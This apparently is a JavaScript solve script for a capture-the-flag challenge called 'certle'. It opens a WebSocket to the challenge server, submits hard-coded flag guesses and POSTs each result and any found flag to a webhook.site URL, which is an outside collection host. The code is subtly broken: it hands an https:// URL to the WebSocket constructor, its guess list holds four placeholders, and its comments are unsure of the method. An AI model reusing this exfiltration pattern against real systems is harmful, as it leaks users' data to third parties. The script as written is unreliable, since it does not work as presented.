// Replace with your GitHub Pages URL for logging (you'll use a different method to log)
// Since GitHub Pages doesn't run server-side code, we'll use a webhook or another service to log.
// Alternatively, you can use a request bin or another logging service.

const LOG_URL = 'https://webhook.site/76f02fe0-b6fd-4d42-8c8f-3a862256e588'; // Replace with your logging endpoint

// List of words to try (include common flag formats and words from words.txt)
const words = [
    "flag{test}",
    "flag{example}",
    "flag{win}",
    "flag{correct}",
    // Add more words here. You might need to brute-force all words from words.txt?
    // But since the flag is probably not in words.txt, try common flag patterns.
];

let currentIndex = 0;

// Open WebSocket to the CTF server (replace with actual CTF domain)
const ws = new WebSocket('https://hack.cert.pl/challenge/certle'); // CHANGE TO ACTUAL CTF DOMAIN

ws.onopen = function() {
    console.log('Connected to WebSocket');
    sendNextGuess();
};

ws.onmessage = function(event) {
    const results = JSON.parse(event.data);
    console.log('Results for', words[currentIndex-1], ':', results);

    // Send results to logging service
    fetch(LOG_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ guess: words[currentIndex-1], results: results })
    }).catch(err => console.error('Error sending log:', err));

    // Check if all are green
    if (results.every(color => color === 'green')) {
        console.log('Flag found:', words[currentIndex-1]);
        // Send the flag to logging service
        fetch(LOG_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ flag: words[currentIndex-1] })
        }).catch(err => console.error('Error sending flag:', err));
    } else {
        // Send next guess
        setTimeout(sendNextGuess, 100);
    }
};

function sendNextGuess() {
    if (currentIndex < words.length) {
        ws.send(JSON.stringify({ answer: words[currentIndex] }));
        currentIndex++;
    } else {
        console.log('No more words to try');
    }
}
